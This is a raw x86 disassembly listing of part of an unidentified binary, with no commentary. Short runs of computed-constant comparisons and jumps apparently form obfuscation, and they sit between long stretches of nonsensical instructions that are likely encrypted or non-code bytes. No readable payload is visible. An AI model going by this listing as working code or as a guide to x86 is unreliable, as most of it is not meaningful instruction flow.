  4184ad:	cmp    DWORD PTR [esi+0x44],edx
  4184b0:	sar    BYTE PTR [ecx+edi*4],cl
  4184b3:	out    dx,al
  4184b4:	and    al,0x8
  4184b6:	sub    eax,0x46c51dfc
  4184bb:	push   eax
  4184bc:	jp     0x418442
  4184be:	push   ds
  4184bf:	pop    edx
  4184c0:	push   ebx
  4184c1:	jmp    0xff278e1d
  4184c6:	pop    ebp
  4184c7:	pop    ebp
  4184c8:	push   edx
  4184c9:	mov    DWORD PTR [esp+0x34],0x4445
  4184d1:	mov    DWORD PTR [esp+0x10],0xa52
  4184d9:	mov    DWORD PTR [esp+0x14],0x1c69
  4184e1:	mov    eax,DWORD PTR [esp+0x10]
  4184e5:	mov    ecx,DWORD PTR [esp+0x14]
  4184e9:	mov    edx,DWORD PTR [esp+0x30]
  4184ed:	mov    ebx,DWORD PTR [esp+0x34]
  4184f1:	add    eax,0xffffd1a5
  4184f6:	adc    ecx,0xffffedf0
  4184fc:	xor    eax,edx
  4184fe:	xor    ecx,ebx
  418500:	and    eax,0x325d
  418505:	mov    DWORD PTR [esp+0x50],eax
  418509:	and    ecx,0x3544
  41850f:	mov    DWORD PTR [esp+0x54],ecx
  418513:	mov    DWORD PTR [esp+0x48],0x1704
  41851b:	mov    DWORD PTR [esp+0x4c],0x4a75
  418523:	mov    DWORD PTR [esp+0x30],0x985
  41852b:	mov    DWORD PTR [esp+0x34],0x341
  418533:	mov    DWORD PTR [esp+0x10],0x5aa9
  41853b:	mov    DWORD PTR [esp+0x14],0x221a
  418543:	mov    eax,DWORD PTR [esp+0x10]
  418547:	mov    ecx,DWORD PTR [esp+0x14]
  41854b:	mov    edx,DWORD PTR [esp+0x30]
  41854f:	mov    ebx,DWORD PTR [esp+0x34]
  418553:	push   ebx
  418554:	push   edx
  418555:	or     ecx,0xc32
  41855b:	or     eax,0x502a
  418560:	push   ecx
  418561:	push   eax
  418562:	call   0x41594e
  418567:	mov    ecx,DWORD PTR [esp+0x48]
  41856b:	mov    ebx,DWORD PTR [esp+0x4c]
  41856f:	sub    eax,ecx
  418571:	mov    ecx,DWORD PTR [esp+0x50]
  418575:	sbb    edx,ebx
  418577:	mov    ebx,DWORD PTR [esp+0x54]
  41857b:	cmp    ecx,eax
  41857d:	jne    0x41858b
  418583:	cmp    ebx,edx
  418585:	je     0x41a937
  41858b:	mov    DWORD PTR [esp+0x30],0x71ba
  418593:	mov    DWORD PTR [esp+0x34],0x5f78
  41859b:	mov    DWORD PTR [esp+0x10],0x7b9c
  4185a3:	mov    DWORD PTR [esp+0x14],0x5622
  4185ab:	mov    eax,DWORD PTR [esp+0x10]
  4185af:	mov    ecx,DWORD PTR [esp+0x14]
  4185b3:	mov    edx,DWORD PTR [esp+0x30]
  4185b7:	mov    ebx,DWORD PTR [esp+0x34]
  4185bb:	jmp    0x418818
  4185c0:	inc    edi
  4185c1:	pop    ebp
  4185c2:	sti    
  4185c3:	daa    
  4185c4:	sti    
  4185c5:	mov    ebx,0x271b9d9b
  4185ca:	mov    esp,0xac2ed0a4
  4185cf:	jecxz  0x4185ad
  4185d1:	out    dx,eax
  4185d2:	sar    BYTE PTR [esi-0x41413dcb],0xcd
  4185d9:	mov    ebx,0xb010926e
  4185de:	aad    0x1
  4185e0:	xor    DWORD PTR [esi+0xe3e6a4e],edx
  4185e6:	outs   dx,DWORD PTR ds:[esi]
  4185e7:	mov    ecx,0xf5b8c6dd
  4185ec:	hlt    
  4185ed:	retf   
  4185ee:	aam    0x30
  4185f0:	mov    edx,0xce1bfe5c
  4185f5:	js     0x4185b4
  4185f7:	sahf   
  4185f8:	sbb    al,0x4a
  4185fa:	and    al,0x3f
  4185fc:	or     al,0x87
  4185fe:	data16 mov ds:0x97bcd65c,al
  418604:	xchg   esi,eax
  418605:	mov    ebx,DWORD PTR [eax-0x7d]
  418608:	jbe    0x418630
  41860a:	fcmovnbe st,st(6)
  41860c:	mov    al,0x12
  41860e:	sbb    DWORD PTR [edi],esi
  418610:	nop
  418611:	call   0x27b9:0xbc9604da
  418618:	fdiv   st,st(5)
  41861a:	or     DWORD PTR [ebx],esi
  41861c:	ss jmp 0xa9a7:0xeb24145e
  418624:	retf   
  418625:	mov    ebx,0xff095d75
  41862a:	outs   dx,BYTE PTR ds:[esi]
  41862b:	sub    BYTE PTR [edx],bl
  41862d:	mov    edx,0x7bd2f252
  418632:	adc    dh,BYTE PTR [eax-0x3dee1a25]
  418638:	stos   DWORD PTR es:[edi],eax
  418639:	mov    bl,0x7b
  41863b:	mov    dh,0x7b
  41863d:	push   cs
  41863e:	dec    ecx
  41863f:	mov    eax,DWORD PTR [ecx+0x4292fa9c]
  418645:	pop    ss
  418646:	jp     0x4185f3
  418648:	js     0x4185fc
  41864a:	push   0xdeafb0ea
  41864f:	dec    edx
  418650:	fstp   DWORD PTR [esi-0x20299940]
  418656:	cmp    al,0xa7
  418658:	fstp   QWORD PTR ds:0x9ad5f412
  41865e:	mov    ebp,es
  418660:	lock or edi,DWORD PTR [ecx+eiz*8]
  418664:	aas    
  418665:	and    DWORD PTR [ecx+eax*8+0xd249bf4],ebp
  41866c:	fisttp QWORD PTR [edi-0xde0d838]
  418672:	in     eax,0xbc
  418674:	(bad)  
  418675:	mov    ebx,0xbd2f84f1
  41867a:	lea    edi,[edx-0x3d414e67]
  418680:	mov    al,0x1d
  418682:	inc    ecx
  418683:	jle    0x4186ad
  418685:	xchg   ebx,eax
  418686:	jo     0x4186c5
  418688:	enter  0x4861,0x8c
  41868c:	or     eax,0xc30e07c1
  418691:	aam    0x29
  418693:	or     al,0xc0
  418696:	push   0x1379d058
  41869b:	ss add eax,0xe5e27e55
  4186a1:	ret    0x16b6
  4186a4:	pushf  
  4186a5:	test   BYTE PTR [ecx],ah
  4186a7:	jne    0x4186d6
  4186a9:	jecxz  0x418660
  4186ab:	adc    ebp,edi
  4186ad:	fnstenv [esi]
  4186af:	jns    0x41864f
  4186b1:	das    
  4186b2:	lahf   
  4186b3:	test   DWORD PTR [edi+0x6e1cd8e3],ecx
  4186b9:	sar    DWORD PTR [esi-0x54f8ee83],1
  4186bf:	repz cdq 
  4186c1:	cli    
  4186c2:	xchg   ecx,eax
  4186c3:	retf   0xbcac
  4186c6:	and    DWORD PTR [edx-0x42],0x6
  4186ca:	mov    esi,0x75afeeee
  4186cf:	ret    0x81b3
  4186d2:	xor    esi,DWORD PTR [ebp+ebx*2+0x46]
  4186d6:	sub    al,0xe1
  4186d8:	fmul   QWORD PTR [esi-0x7e]
  4186db:	mov    dh,0x72
  4186dd:	push   ebp
  4186de:	mov    dl,0x6
  4186e0:	int3   
  4186e1:	test   al,0xb9
  4186e3:	add    DWORD PTR [edx-0x94a4369],edx
  4186e9:	ss sbb al,0x4
  4186ec:	push   edx
  4186ed:	outs   dx,BYTE PTR ds:[esi]
  4186ee:	inc    ebp
  4186ef:	dec    ebx
  4186f0:	inc    ecx
  4186f1:	or     eax,0xd1a41e5d
  4186f6:	int    0x89
  4186f8:	ins    DWORD PTR es:[edi],dx
  4186f9:	push   edi
  4186fa:	mov    ?,WORD PTR [ecx+0x2d9759f8]
  418700:	dec    ebx
  418701:	jecxz  0x4186e7
  418703:	sub    eax,DWORD PTR [edx]
  418705:	dec    edx
  418706:	or     cl,BYTE PTR [edi+0x64]
  418709:	(bad)  
  41870a:	ins    BYTE PTR es:[edi],dx
  41870b:	push   eax
  41870c:	mov    bh,cl
  41870e:	add    eax,esp
  418710:	or     eax,0x4852f2cf
  418715:	mul    DWORD PTR [edi+0x1]
  418718:	(bad)  
  418719:	fdivr  QWORD PTR [ebx-0x33]
  41871c:	mov    esi,0xc0637c5c
  418721:	aaa    
  418722:	call   0xcba4:0x7db0efb3
  418729:	ja     0x418704
  41872b:	lods   eax,DWORD PTR ds:[esi]
  41872c:	xchg   BYTE PTR [edx-0x6c05f3bd],dl
  418732:	cs addr16 sub ch,bh
  418736:	cmp    eax,0xe293630b
  41873b:	dec    edi
  41873c:	pop    eax
  41873d:	cmc    
  41873e:	(bad)  
  41873f:	jecxz  0x4187a6
  418741:	mov    DWORD PTR ds:0x606ce472,ecx
  418747:	int3   
  418748:	jecxz  0x41874f
  41874a:	mov    ebp,0x15dfc6d0
  41874f:	icebp  
  418750:	loop   0x418725
  418752:	or     bh,0xc7
  418755:	or     BYTE PTR [edi],bl
  418757:	and    esi,DWORD PTR [esi]
  418759:	(bad)  
  41875a:	jecxz  0x4187bc
  41875c:	imul   edi,DWORD PTR [edi],0x3402ddf4
  418762:	mov    esi,0xd75d9d5d
  418767:	mov    DWORD PTR [edi-0x48b47f03],edx
  41876d:	sbb    al,0xe3
  41876f:	mov    ebp,0x8801ecf8
  418774:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418775:	cmc    
  418776:	pop    esp
  418777:	iret   
  418778:	mov    edi,0x17e4e1df
  41877d:	jo     0x4187dd
  41877f:	jae    0x4187a1
  418781:	dec    ecx
  418782:	imul   ebx,DWORD PTR [ebx-0x58],0x74
  418786:	pop    ebp
  418787:	push   edx
  418788:	dec    ecx
  418789:	pop    esi
  41878a:	xor    bl,BYTE PTR [esi-0x69a774ce]
  418790:	in     eax,dx
  418791:	mov    ah,0xd9
  418793:	lea    eax,[eax+0xc]
  418796:	je     0x4187b4
  418798:	jle    0x418756
  41879a:	in     al,dx
  41879b:	arpl   WORD PTR [edi-0x2f],bp
  41879e:	pop    eax
  41879f:	(bad)  
  4187a1:	adc    eax,0x516a39f7
  4187a6:	xchg   ebx,eax
  4187a7:	test   al,0xfb
  4187a9:	popf   
  4187aa:	pop    esi
  4187ab:	fldenv [ebx+eiz*2]
  4187ae:	sbb    BYTE PTR [edi+0x6c35c095],dl
  4187b4:	into   
  4187b5:	lods   al,BYTE PTR ds:[esi]
  4187b6:	pop    edi
  4187b7:	(bad)  
  4187b8:	pop    ds
  4187b9:	inc    eax
  4187ba:	dec    BYTE PTR [edx+eiz*1-0x41]
  4187be:	les    esp,FWORD PTR [eax-0x37]
  4187c1:	pop    es
  4187c2:	add    ch,BYTE PTR [edi]
  4187c4:	xor    al,0xe5
  4187c6:	cmp    al,0xf9
  4187c8:	dec    eax
  4187c9:	sbb    bh,BYTE PTR [ecx]
  4187cb:	jmp    0x4187c4
  4187cd:	(bad)
  4187d1:	mov    ds,WORD PTR [ebx+0x3f296ae]
  4187d7:	(bad)  
  4187d8:	mov    ebx,eax
  4187da:	test   DWORD PTR [esi],edi
  4187dc:	mov    al,0xdd
  4187de:	jnp    0x418804
  4187e0:	dec    ecx
  4187e1:	hlt    
  4187e2:	fisubr DWORD PTR [edx-0x71]
  4187e5:	dec    eax
  4187e6:	push   DWORD PTR [edi+edx*4+0x32]
  4187ea:	pop    eax
  4187eb:	adc    ecx,DWORD PTR [eax+edx*8-0x2]
  4187ef:	(bad)  
  4187f0:	stc    
  4187f1:	stos   BYTE PTR es:[edi],al
  4187f2:	icebp  
  4187f3:	sub    DWORD PTR [ebx+edi*2-0x92b2f07],ebp
  4187fa:	(bad)  
  4187fb:	dec    esp
  4187fc:	xchg   esp,eax
  4187fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4187fe:	jl     0x4187ac
  418800:	std    
  418801:	mov    ds:0x431d57a3,al
  418806:	ins    DWORD PTR es:[edi],dx
  418807:	sbb    eax,0xd94eb0ef
  41880c:	imul   edi,DWORD PTR [ebx],0xffffffa0
  41880f:	jl     0x4187d3
  418811:	sub    eax,0x20792c62
  418816:	rol    DWORD PTR ss:0x3646,1
  41881d:	adc    ecx,0x7ace
  418823:	xor    eax,0x3e2e
  418828:	xor    ecx,0x4b71
  41882e:	and    eax,edx
  418830:	mov    DWORD PTR [esp+0x88],eax
  418837:	and    ecx,ebx
  418839:	mov    DWORD PTR [esp+0x8c],ecx
  418840:	mov    DWORD PTR [esp+0x50],0x18d6
  418848:	mov    DWORD PTR [esp+0x54],0x2bb4
  418850:	mov    DWORD PTR [esp+0x48],0x14
  418858:	mov    DWORD PTR [esp+0x4c],0x0
  418860:	mov    DWORD PTR [esp+0x30],0x1
  418868:	mov    DWORD PTR [esp+0x34],0x0
  418870:	mov    DWORD PTR [esp+0x10],0xa87
  418878:	mov    DWORD PTR [esp+0x14],0x7fd9
  418880:	jmp    0x418add
  418885:	mov    dh,0xe5
  418887:	jmp    0x836c:0xb814b913
  41888e:	adc    DWORD PTR [esi-0xf8e1c70],ebx
  418894:	iret   
  418895:	push   ebx
  418896:	repz sar BYTE PTR [esi-0x41413dcb],0x7e
  41889e:	test   al,0x83
  4188a0:	ret    
  4188a1:	jmp    0x41890d
  4188a3:	jge    0x41889d
  4188a5:	test   ebp,edx
  4188a7:	imul   edx,ebp,0xffffffa4
  4188aa:	inc    BYTE PTR [ebp-0x29]
  4188ad:	scas   eax,DWORD PTR es:[edi]
  4188ae:	test   eax,0x59bc3a79
  4188b3:	loope  0x4188ed
  4188b5:	inc    ebp
  4188b6:	dec    edx
  4188b7:	pop    edx
  4188b8:	pop    ebp
  4188b9:	push   ecx
  4188ba:	jge    0x41883c
  4188bc:	pushf  
  4188bd:	add    BYTE PTR [eax],dl
  4188bf:	retf   0xf213
  4188c2:	rcr    BYTE PTR [esi+eiz*8+0x72],0x68
  4188c7:	cmp    BYTE PTR [edi+0x663059d2],bh
  4188cd:	xor    DWORD PTR [eax],ebp
  4188cf:	in     al,dx
  4188d0:	test   eax,0x1c40896a
  4188d5:	mov    esp,0x675cbdc
  4188da:	pop    esi
  4188db:	dec    ebp
  4188dc:	sub    al,0x99
  4188de:	or     BYTE PTR [edi],bl
  4188e0:	mov    esi,0x4aa61d69
  4188e5:	mov    WORD PTR [ebp-0x29],ds
  4188e8:	xchg   dh,dl
  4188ea:	repnz popf 
  4188ec:	ins    DWORD PTR es:[edi],dx
  4188ed:	out    dx,eax
  4188ee:	dec    ebx
  4188ef:	push   eax
  4188f0:	fwait
  4188f1:	mov    esp,0x5b425884
  4188f6:	and    al,0x76
  4188f8:	xchg   edi,eax
  4188f9:	adc    BYTE PTR [ebx+0x59471139],bh
  4188ff:	pop    es
  418900:	aas    
  418901:	out    dx,al
  418902:	dec    edx
  418903:	mov    dh,0x9b
  418905:	pop    edx
  418906:	add    DWORD PTR [ebx-0x2d],esi
  418909:	stos   BYTE PTR es:[edi],al
  41890a:	jbe    0x41891b
  41890c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41890d:	and    eax,0x3eb05e28
  418912:	mov    bl,0xdd
  418914:	repz out dx,al
  418916:	sbb    DWORD PTR [ecx-0x28],ebx
  418919:	inc    edi
  41891a:	nop
  41891b:	sbb    DWORD PTR ds:0x6e3a580e,0xffffff80
  418922:	cmp    edi,DWORD PTR [eax-0x39]
  418925:	enter  0x2c33,0x2
  418929:	imul   edi,DWORD PTR [ebx+esi*1],0xffffffa7
  41892d:	mov    ecx,0xc2f980d5
  418932:	cmc    
  418933:	lock sbb BYTE PTR [edi+0x38553b58],cl
  41893a:	aam    0xd7
  41893c:	adc    cl,ah
  41893e:	adc    dl,ch
  418940:	inc    ebx
  418941:	xchg   ebp,eax
  418942:	in     al,dx
  418943:	scas   eax,DWORD PTR es:[edi]
  418944:	into   
  418945:	ror    BYTE PTR [ecx-0x5af857b9],0xcf
  41894c:	popf   
  41894d:	inc    edi
  41894e:	sahf   
  41894f:	arpl   WORD PTR [ecx],ax
  418951:	shl    BYTE PTR [ebx],1
  418953:	lods   al,BYTE PTR ds:[esi]
  418954:	and    ch,bl
  418956:	fsubp  st(6),st
  418958:	pop    es
  418959:	lahf   
  41895a:	inc    ebp
  41895b:	xchg   esi,eax
  41895c:	les    edi,FWORD PTR [eax]
  41895e:	stos   BYTE PTR es:[edi],al
  41895f:	dec    ebx
  418960:	lods   eax,DWORD PTR ds:[esi]
  418961:	dec    ecx
  418962:	iret   
  418963:	(bad)  
  418964:	jnp    0x418921
  418966:	sub    bl,BYTE PTR [eax-0x7ded85a4]
  41896c:	cmp    dh,BYTE PTR [eax-0x39aaf714]
  418972:	data16 ja 0x4189a2
  418975:	xor    bh,al
  418977:	lds    ecx,FWORD PTR [edi+0x1f8f2c4b]
  41897d:	and    eax,0xc0c5dcfd
  418982:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418983:	hlt    
  418984:	ret    0x7848
  418987:	mov    al,al
  418989:	xchg   ebp,eax
  41898a:	sar    BYTE PTR [ebp+0x7ea7b2fc],cl
  418990:	enter  0x4fc0,0x44
  418994:	mov    ds:0x7d5e673,al
  418999:	add    BYTE PTR [esi-0x27],ah
  41899c:	add    eax,0x5284cf4c
  4189a1:	mov    cl,0x62
  4189a3:	retf   0xb6f7
  4189a6:	test   BYTE PTR [ecx+0x53],dh
  4189a9:	dec    ecx
  4189aa:	sub    DWORD PTR [edx+0x1e],edx
  4189ad:	iret   
  4189ae:	cmp    edx,DWORD PTR [ecx+0x35]
  4189b1:	iret   
  4189b2:	mov    al,0xa1
  4189b4:	ds jp  0x4189a6
  4189b7:	jb     0x4189fb
  4189b9:	int3   
  4189ba:	inc    eax
  4189bb:	xor    eax,0x75d8fb1a
  4189c0:	cld    
  4189c1:	in     al,dx
  4189c2:	test   DWORD PTR [ebp+0x7dea620e],edi
  4189c8:	repz jno 0x418999
  4189cb:	loope  0x4189c3
  4189cd:	loopne 0x4189d6
  4189cf:	std    
  4189d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4189d1:	jg     0x4189c5
  4189d3:	ror    DWORD PTR [ebp+0x28],0xbc
  4189d7:	mov    al,0x50
  4189d9:	or     DWORD PTR [ebp+0x713e843a],edx
  4189df:	lea    eax,[eax+0x62c29e17]
  4189e5:	inc    edx
  4189e6:	rol    DWORD PTR [ecx+0x5c],cl
  4189e9:	enter  0x438c,0xb6
  4189ed:	sbb    DWORD PTR [edx-0x70],ebp
  4189f0:	iret   
  4189f1:	out    dx,eax
  4189f2:	(bad)  
  4189f3:	js     0x418978
  4189f5:	scas   al,BYTE PTR es:[edi]
  4189f6:	es pusha 
  4189f8:	mov    esp,eax
  4189fa:	lds    ebp,FWORD PTR [edx+0x5f06b2ff]
  418a00:	mov    al,ds:0x3b1b3305
  418a05:	sbb    al,0x1f
  418a07:	(bad)  
  418a08:	in     eax,0x3e
  418a0a:	cmp    edx,DWORD PTR [ebp-0x48e45e8e]
  418a10:	inc    ebx
  418a11:	popa   
  418a12:	scas   al,BYTE PTR es:[edi]
  418a13:	mov    esi,0xb97dcdcf
  418a18:	in     eax,0x46
  418a1a:	mov    eax,ds:0x954dc0e7
  418a1f:	enter  0xcc8f,0x1b
  418a23:	ror    BYTE PTR [edx],1
  418a25:	pusha  
  418a26:	iret   
  418a27:	cmp    eax,0xdffc1f8f
  418a2c:	ss and al,0x34
  418a2f:	add    eax,0xe525fedc
  418a34:	iret   
  418a35:	push   0xffffffa1
  418a37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a38:	dec    ebx
  418a39:	shr    BYTE PTR [esi],cl
  418a3b:	cmp    eax,0x6a70847
  418a40:	out    dx,eax
  418a41:	mov    cl,0x30
  418a43:	sub    BYTE PTR [eax-0x778c789b],al
  418a49:	fs xchg esi,edi
  418a4c:	imul   esp,DWORD PTR [ebx],0x3e
  418a4f:	ret    0xdc79
  418a52:	arpl   WORD PTR [ebp-0x35],cx
  418a55:	dec    ecx
  418a56:	pop    ss
  418a57:	xor    DWORD PTR [edi+0x11],ebx
  418a5a:	fwait
  418a5b:	dec    esp
  418a5c:	in     eax,0xcb
  418a5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a5f:	adc    al,0x37
  418a61:	xor    eax,0x9dea7056
  418a66:	fxam   
  418a68:	or     esp,DWORD PTR [eax]
  418a6a:	sub    DWORD PTR [eax-0x72f62949],ebp
  418a70:	lea    esi,[edi]
  418a72:	loopne 0x418abd
  418a74:	fstp   DWORD PTR [ecx]
  418a76:	jge    0x418aed
  418a78:	xchg   ebx,eax
  418a79:	xchg   ebp,eax
  418a7a:	xchg   BYTE PTR [edx-0x7c],dh
  418a7d:	xchg   ebx,eax
  418a7e:	xchg   edi,eax
  418a7f:	adc    al,0x27
  418a81:	inc    eax
  418a82:	fldcw  WORD PTR [esi-0x3488a31f]
  418a88:	pop    ebp
  418a89:	mov    ds:0x9949f541,eax
  418a8e:	sahf   
  418a8f:	mov    ch,0x4e
  418a91:	jbe    0x418a6a
  418a93:	inc    ebx
  418a94:	push   ebp
  418a95:	adc    al,0xc5
  418a97:	rol    BYTE PTR [ecx+0x5a7a369c],cl
  418a9d:	mov    ds:0xb572e605,eax
  418aa2:	ss mov al,0x73
  418aa5:	mov    cl,0x98
  418aa7:	shr    DWORD PTR [esi+0x51],0xb8
  418aab:	test   eax,0xb8abe25a
  418ab0:	imul   edx,DWORD PTR [esi+0x433822db],0x7a08ccaf
  418aba:	lods   al,BYTE PTR ds:[esi]
  418abb:	xor    eax,0x4db55a95
  418ac0:	push   esi
  418ac1:	add    bh,BYTE PTR [eax-0x591dd3e1]
  418ac7:	mov    edi,0x661cd04f
  418acc:	nop
  418acd:	or     eax,0x3cd61895
  418ad2:	xchg   edx,eax
  418ad3:	mov    ds:0xbebcabb9,eax
  418ad8:	addr16 and eax,0x8b7a3c37
  418ade:	inc    esp
  418adf:	and    al,0x10
  418ae1:	mov    ecx,DWORD PTR [esp+0x14]
  418ae5:	push   0x2
  418ae7:	push   0x7f349462
  418aec:	xor    ecx,0x3601
  418af2:	xor    eax,0x5491
  418af7:	push   ecx
  418af8:	push   eax
  418af9:	call   0x422281
  418afe:	mov    ecx,DWORD PTR [esp+0x30]
  418b02:	mov    ebx,DWORD PTR [esp+0x34]
  418b06:	push   ebx
  418b07:	push   ecx
  418b08:	push   edx
  418b09:	push   eax
  418b0a:	call   0x422281
  418b0f:	mov    ecx,DWORD PTR [esp+0x48]
  418b13:	mov    ebx,DWORD PTR [esp+0x4c]
  418b17:	jmp    0x418d74
  418b1c:	jp     0x418ac4
  418b1e:	cld    
  418b1f:	dec    eax
  418b20:	cmp    al,0x9c
  418b22:	jp     0x418ae0
  418b24:	js     0x418b9b
  418b26:	push   esp
  418b27:	sahf   
  418b28:	jnp    0x418b54
  418b2a:	cwde   
  418b2b:	jecxz  0x418af8
  418b2d:	test   eax,0xbec235be
  418b33:	mov    esi,0x921e495e
  418b38:	mov    bl,0xc5
  418b3a:	sti    
  418b3b:	dec    edi
  418b3c:	test   BYTE PTR [ebx+0x46],dh
  418b3f:	xlat   BYTE PTR ds:[ebx]
  418b40:	adc    DWORD PTR [edi-0x76351072],0x3ef78086
  418b4a:	clc    
  418b4b:	pop    edi
  418b4c:	sub    eax,DWORD PTR [edx+0x4438045]
  418b52:	outs   dx,DWORD PTR ds:[esi]
  418b53:	jo     0x418b7c
  418b55:	inc    esi
  418b56:	sar    dh,1
  418b58:	or     DWORD PTR gs:[ebx-0x27],ebp
  418b5c:	jo     0x418b93
  418b5e:	fwait
  418b5f:	in     eax,dx
  418b60:	addr16 xchg esi,eax
  418b62:	es inc ebx
  418b64:	mov    ebp,0xd62186e7
  418b69:	idiv   ebp
  418b6b:	test   DWORD PTR [esi-0x68],ebp
  418b6e:	mov    WORD PTR [esi-0x2904162d],ds
  418b74:	jg     0x418be3
  418b76:	cdq    
  418b77:	push   ebp
  418b78:	push   ss
  418b79:	adc    eax,0xa24ea9a7
  418b7e:	add    BYTE PTR [esi],dh
  418b80:	arpl   WORD PTR [ecx],di
  418b82:	pop    ebx
  418b83:	pop    ss
  418b84:	push   cs
  418b85:	push   eax
  418b86:	repnz imul BYTE PTR [ebx-0x77855dc9]
  418b8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b8e:	push   edi
  418b8f:	gs add al,0xc3
  418b92:	and    ecx,DWORD PTR [ebx+0x22]
  418b95:	loopne 0x418bc3
  418b97:	cld    
  418b98:	cs inc ebp
  418b9a:	mov    dh,0xb4
  418b9c:	dec    edx
  418b9d:	jbe    0x418b95
  418b9f:	add    DWORD PTR [eax-0x416378b8],ebx
  418ba5:	int    0x57
  418ba7:	mov    bh,0xe1
  418ba9:	mov    BYTE PTR [esi+ecx*4],ah
  418bac:	mov    dh,0x3f
  418bae:	jmp    0x418b6d
  418bb0:	es push esp
  418bb3:	dec    ecx
  418bb4:	loopne 0x418b88
  418bb6:	fadd   DWORD PTR [edi+0x69]
  418bb9:	std    
  418bba:	mov    eax,0x55439330
  418bbf:	fdivr  QWORD PTR [eax]
  418bc1:	sbb    DWORD PTR [ecx-0x5ad11816],edx
  418bc7:	in     al,dx
  418bc8:	push   ebx
  418bc9:	fcmovnb st,st(6)
  418bcb:	sbb    BYTE PTR [esp+ecx*1-0x16],dh
  418bcf:	inc    esp
  418bd0:	xchg   esp,eax
  418bd1:	push   0xffffffab
  418bd3:	jl     0x418c4b
  418bd5:	scas   eax,DWORD PTR es:[edi]
  418bd6:	cmp    BYTE PTR ds:0x4f52c71,ch
  418bdc:	jbe    0x418b90
  418bde:	in     eax,0xdd
  418be0:	loope  0x418c46
  418be2:	add    eax,0xda8bf203
  418be7:	lods   eax,DWORD PTR ds:[esi]
  418be8:	jo     0x418c54
  418bea:	je     0x418ba6
  418bec:	sbb    bh,0xb8
  418bef:	pusha  
  418bf0:	je     0x418bdc
  418bf2:	cmp    DWORD PTR [esi+0x53],0xbee430d9
  418bf9:	call   0x2444:0x5107f368
  418c00:	out    0x21,al
  418c02:	fadd   st,st(3)
  418c04:	outs   dx,DWORD PTR ds:[esi]
  418c05:	out    dx,eax
  418c06:	xlat   BYTE PTR ds:[ebx]
  418c07:	xchg   esp,eax
  418c08:	cld    
  418c09:	mov    ebp,0xfc94eac
  418c0e:	call   0x79ad:0x5b28c46f
  418c15:	adc    eax,0x89b82795
  418c1a:	std    
  418c1b:	and    eax,0x142690f2
  418c20:	in     al,0x6d
  418c22:	cwde   
  418c23:	int3   
  418c24:	icebp  
  418c25:	push   edi
  418c26:	push   0xc54341fd
  418c2b:	or     eax,0xeaabc77f
  418c30:	and    eax,0x91dc7c84
  418c35:	push   esp
  418c36:	jl     0x418c76
  418c38:	js     0x418c5f
  418c3a:	mov    ebx,0x223a0051
  418c3f:	ja     0x418ca2
  418c41:	das    
  418c42:	ds jmp 0x940a:0x5c8a3463
  418c4a:	sub    DWORD PTR ss:[esi+0x19b99ac7],ebx
  418c51:	in     al,dx
  418c52:	cmp    al,0x29
  418c54:	fist   DWORD PTR [edx+0x5d]
  418c57:	add    ebx,ebx
  418c59:	pop    ds
  418c5a:	hlt    
  418c5b:	push   ss
  418c5c:	retf   
  418c5d:	nop
  418c5e:	imul   ecx,DWORD PTR [ebx],0xa
  418c61:	mov    ch,0xe1
  418c63:	test   BYTE PTR [edx],ch
  418c65:	test   al,0x49
  418c67:	push   es
  418c68:	mov    ch,0xc1
  418c6a:	out    dx,al
  418c6b:	call   0x6e0b8ca
  418c70:	push   ebx
  418c71:	jmp    0x8b2f7595
  418c76:	add    DWORD PTR [edx-0x59e967c9],ebx
  418c7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c7d:	add    BYTE PTR [ebx-0x5e717830],cl
  418c83:	call   0xf6666cb6
  418c88:	and    ch,bh
  418c8a:	call   0x81a3:0xd6852ce6
  418c91:	jns    0x418c83
  418c93:	mov    esi,0x6df6b060
  418c98:	fbstp  TBYTE PTR [eax]
  418c9a:	dec    edi
  418c9b:	cmp    ebx,DWORD PTR [ecx-0x3836ff3e]
  418ca1:	mov    edx,0xfb49677
  418ca6:	cmp    BYTE PTR [eax],al
  418ca8:	test   al,0xc9
  418caa:	cwde   
  418cab:	xchg   ebp,eax
  418cad:	clc    
  418cae:	unpcklps xmm4,XMMWORD PTR [eax]
  418cb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418cb2:	push   esp
  418cb3:	xchg   esi,eax
  418cb4:	icebp  
  418cb5:	fdiv   st(5),st
  418cb7:	push   edx
  418cb8:	sahf   
  418cb9:	sub    DWORD PTR [esi],ebp
  418cbb:	mov    edi,edi
  418cbd:	xor    al,0xc8
  418cbf:	cld    
  418cc0:	enter  0xc29b,0xc7
  418cc4:	ins    DWORD PTR es:[edi],dx
  418cc5:	scas   eax,DWORD PTR es:[edi]
  418cc6:	mov    ebp,0x784c4e25
  418ccb:	inc    edi
  418ccc:	push   es
  418ccd:	pop    esp
  418cce:	add    cl,dl
  418cd0:	hlt    
  418cd1:	pop    ebp
  418cd2:	rol    al,cl
  418cd4:	test   eax,0x60df74e3
  418cd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418cda:	ds pop ebp
  418cdc:	pop    ds
  418cdd:	xchg   esi,eax
  418cde:	enter  0xf90c,0xed
  418ce2:	ficomp WORD PTR [ecx]
  418ce4:	mov    eax,0x9a59c367
  418ce9:	push   ebp
  418cea:	ds pop ss
  418cec:	add    BYTE PTR [edi+0x675e0b8a],cl
  418cf2:	add    ecx,DWORD PTR [ebx+0x49c42285]
  418cf8:	jp     0x418cba
  418cfa:	jbe    0x418ce0
  418cfc:	dec    edi
  418cfd:	xchg   DWORD PTR [ecx+edi*2-0x61c24d0f],ebp
  418d04:	scas   eax,DWORD PTR es:[edi]
  418d05:	and    cl,ah
  418d07:	das    
  418d08:	dec    edx
  418d09:	mov    al,0x39
  418d0b:	push   ds
  418d0c:	stc    
  418d0d:	mov    ah,0x6c
  418d0f:	imul   ecx,DWORD PTR [esp+eiz*2+0x75],0x65c7b50b
  418d17:	jecxz  0x418cd8
  418d19:	add    edi,DWORD PTR [ebp-0x8]
  418d1c:	mov    esi,0xb389c7ab
  418d21:	aad    0x5b
  418d23:	mov    bl,0x9
